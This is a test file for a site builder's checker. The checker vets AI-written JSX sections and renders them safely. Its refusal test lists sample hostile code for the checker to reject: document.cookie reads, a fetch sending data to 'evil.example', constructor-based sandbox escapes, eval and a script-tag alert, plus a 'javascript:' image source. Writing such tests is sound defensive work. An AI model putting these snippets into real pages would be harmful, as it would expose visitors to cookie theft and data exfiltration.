import { describe, expect, it } from 'vitest';
import { customDataSchema, siteConfigSchema } from '../schema';
import { KORA_KITCHEN } from '../samples/kora-kitchen';
import { checkCustomCode, codeOnly } from './check';
import { createRuntime } from './runtime';

const TIMELINE = `
type Item = { year: string; title: string; text: string };
export default function Section({ data }: { data: { heading: string; items: Item[]; photo: { src: string; alt: string } } }) {
  // Our history, top to bottom: words like "history" and "top" are fine in copy.
  return (
    <section className="s-section">
      <div className="mx-auto max-w-5xl px-6">
        <h2 className="s-heading s-h2">{data.heading}</h2>
        <ol className="mt-8 grid gap-6">
          {data.items.map((item, i) => (
            <li key={i} className="flex gap-4" style={{ paddingLeft: 8, opacity: 0.9 }}>
              <span className="font-semibold text-site-primary">{item.year}</span>
              <div>
                <h3 className="font-semibold">{item.title}</h3>
                <p className="text-site-muted">{item.text} — top of the class, the whole process</p>
              </div>
            </li>
          ))}
        </ol>
        {data.photo.src && <img src={data.photo.src} alt={data.photo.alt} className="mt-8 w-full" />}
        <>{\`Since \${data.items[0]?.year ?? ''}\`}</>
      </div>
    </section>
  );
}`;

const data = {
  heading: 'Our story <so far>',
  items: [
    { year: '2014', title: 'First stall', text: 'Saturday market' },
    { year: '2019', title: 'The restaurant', text: 'Mill Lane & more' },
  ],
  photo: { src: 'javascript:alert(1)', alt: 'The team' },
};

function run(js: string) {
  const rt = createRuntime();
  // Trusted test code only; in the studio this runs inside the sandboxed frame.
  const component = new Function('h', 'Fragment', js)(rt.h, rt.Fragment);
  return rt.render(component, data);
}

describe('checking AI-written sections', () => {
  it('accepts a plain component and compiles it for the preview', () => {
    const r = checkCustomCode(TIMELINE);
    expect(r.problems).toEqual([]);
    const html = run(r.js!);
    expect(html).toContain('<h2 class="s-heading s-h2">Our story &lt;so far&gt;</h2>');
    expect(html).toContain('<li class="flex gap-4" style="padding-left:8px;opacity:0.9">');
    expect(html).toContain('Mill Lane &amp; more');
    expect(html).toContain('src="#"'); // javascript: links are neutralised
    expect(html).toContain('Since 2014');
    expect(html).not.toContain('key=');
  });

  it('refuses anything that reaches outside the section', () => {
    const wrap = (inner: string) => `export default function Section({ data }) { ${inner} return <div>{data.heading}</div>; }`;
    const refused = {
      imports: `import x from 'y';\n${wrap('')}`,
      cookies: wrap('const c = document.cookie;'),
      network: wrap('fetch("https://evil.example/" + data.heading);'),
      timers: wrap('setTimeout(() => 1, 1);'),
      hooks: wrap('const [a] = useState(0);'),
      internals: wrap('const f = data.constructor.constructor;'),
      computed: wrap('const f = []["fil" + "ter"];'),
      templateExpression: wrap('const s = `${window.name}`;'),
      eval: wrap('eval("1");'),
      regex: wrap('const r = /x/.source;'),
      builtKey: wrap('const k = "constr" + "uctor"; const f = data[k][k];'),
      stringKey: wrap('const f = data["constructor"];'),
      loop: wrap('while (true) {}'),
      forLoop: wrap('for (;;) {}'),
      variableTag: 'export default function Section({ data }) { const Tag = data.tag; return <Tag>x</Tag>; }',
    };
    for (const [what, code] of Object.entries(refused)) expect(checkCustomCode(code).problems.length, what).toBeGreaterThan(0);
    expect(checkCustomCode('export default function Section({ data }) { return <script>{"alert(1)"}</script>; }').problems[0]).toMatch(/script/);
    expect(checkCustomCode('export default function Section({ data }) { return <div dangerouslySetInnerHTML={{ __html: data.x }} />; }').problems[0]).toMatch(/raw HTML/);
    expect(checkCustomCode('export default function Section({ data }) { return <button onClick={() => 1}>x</button>; }').problems[0]).toMatch(/event handlers/);
    expect(checkCustomCode('function Section() { return <div /> }').problems[0]).toMatch(/export default function/);
    expect(checkCustomCode('export default function Section({ data }) { return <div>; }').problems[0]).toMatch(/compile/);
  });

  it('still allows indexes, array literals, destructuring and small components', () => {
    const code = `const Card = ({ item }) => <li>{item.title}</li>;
function Badge({ text }) { return <b>{text}</b>; }
export default function Section({ data }) {
  const [first] = data.moments;
  const pair = [data.heading, first?.title];
  return <ul>{data.moments.map((m) => <Card item={m} />)}<Badge text={pair[0]} />{data.moments[0]?.year}</ul>;
}`;
    expect(checkCustomCode(code).problems).toEqual([]);
  });

  it('leaves strings and comments out of the scan', () => {
    expect(codeOnly('a("window") // document\n/* fetch */ b(`x ${c} window`)')).toBe('a("") \n b("" c)');
  });
});

describe('custom sections in a site', () => {
  const def = {
    name: 'Timeline',
    purpose: 'The story of the business, year by year',
    fields: [
      { key: 'heading', label: 'Heading', type: 'text' as const },
      { key: 'items', label: 'Moments', type: 'list' as const, fields: [{ key: 'year', label: 'Year', type: 'text' as const }, { key: 'title', label: 'Title', type: 'text' as const }, { key: 'text', label: 'Text', type: 'paragraph' as const }], max: 10 },
      { key: 'photo', label: 'Photo', type: 'image' as const },
    ],
    code: TIMELINE,
    js: checkCustomCode(TIMELINE).js!,
    reviewed: false,
  };

  it('validates each section’s content against its fields', () => {
    expect(customDataSchema(def.fields).safeParse({ ...data, photo: { src: '', alt: '' } }).success).toBe(true);
    expect(customDataSchema(def.fields).safeParse({ heading: 'x', items: 'nope', photo: { src: '', alt: '' } }).success).toBe(false);
    const site = structuredClone(KORA_KITCHEN);
    site.customSections = { timeline: def };
    site.pages[0].sections.splice(1, 0, { id: 'home-timeline', type: 'custom', variant: 'default', content: { component: 'timeline', data: { ...data, photo: { src: '', alt: '' } } } });
    expect(siteConfigSchema.safeParse(site).success).toBe(true);
    const missing = structuredClone(site);
    delete missing.customSections;
    expect(siteConfigSchema.safeParse(missing).success).toBe(false);
  });
});
